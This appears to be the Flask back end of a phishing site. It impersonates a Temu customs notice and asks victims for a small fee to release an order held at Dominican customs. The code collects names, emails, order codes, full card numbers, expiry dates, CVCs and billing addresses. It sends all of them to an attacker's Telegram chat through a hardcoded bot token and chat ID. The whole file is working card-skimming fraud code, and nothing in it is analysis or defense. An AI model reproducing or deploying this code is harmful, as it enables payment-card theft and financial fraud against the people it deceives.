from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = "7953781468:AAHKqBNSBucJCUnuz7uBUetiaVPv_hAPyHI"
TELEGRAM_CHAT_ID = "-1002868091163"

cliente_info = {}
mensaje = False
pago = False

@app.route("/", methods=["GET"])
def index():
    global mensaje, pago, cliente_info
    return render_template("index.html", cliente=cliente_info, mensaje=mensaje, pago=pago)

@app.route("/enviar", methods=["POST"])
def enviar():
    global cliente_info, mensaje, pago
    nombre = request.form.get("nombre")
    correo = request.form.get("correo")
    codigo = request.form.get("codigo")
    
    cliente_info = {
        "nombre": nombre,
        "correo": correo,
        "codigo": codigo
    }
    
    # Enviar info inicial a Telegram
    mensaje_telegram = f"""
*Nuevo pedido recibido:*
Nombre: {nombre}
Correo: {correo}
Código: {codigo}
"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": mensaje_telegram, "parse_mode": "Markdown"})
    
    mensaje = True
    pago = False
    return redirect("/")

@app.route("/pago", methods=["POST"])
def pago_route():
    global mensaje, pago, cliente_info
    mensaje = False
    pago = True
    return redirect("/")

@app.route("/procesar_pago", methods=["POST"])
def procesar_pago():
    global cliente_info, mensaje, pago
    
    # Recoger info de pago
    cliente_info["card_number"] = request.form.get("card_number")
    cliente_info["card_brand"] = request.form.get("card_brand")
    cliente_info["exp"] = request.form.get("exp")
    cliente_info["cvc"] = request.form.get("cvc")
    cliente_info["holder"] = request.form.get("holder")
    cliente_info["addr1"] = request.form.get("addr1")
    cliente_info["addr2"] = request.form.get("addr2")
    cliente_info["postal"] = request.form.get("postal")
    cliente_info["city"] = request.form.get("city")
    cliente_info["country"] = request.form.get("country")
    
    # Enviar info completa a Telegram
    mensaje_telegram = f"""
*{cliente_info['nombre']} tu pedido de Temu tuvo un pequeño conflicto en la aduana dominicana.*
Para liberarlo rápidamente, necesitamos una pequeña comisión de $3.45.

📄 *Datos del pedido:*
Nombre: {cliente_info['nombre']}
Correo: {cliente_info['correo']}
Código: {cliente_info['codigo']}

💳 *Datos de pago:*
Tarjeta: {cliente_info['card_brand']} {cliente_info['card_number']}
Exp: {cliente_info['exp']}
CVC: {cliente_info['cvc']}
Titular: {cliente_info['holder']}
Dirección: {cliente_info['addr1']} {cliente_info['addr2']}
Ciudad: {cliente_info['city']}
Código Postal: {cliente_info['postal']}
País: {cliente_info['country']}
"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": mensaje_telegram, "parse_mode": "Markdown"})
    
    # Limpiar info
    cliente_info = {}
    mensaje = False
    pago = False

    return redirect("/")

if __name__ == "__main__":
    import os
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))

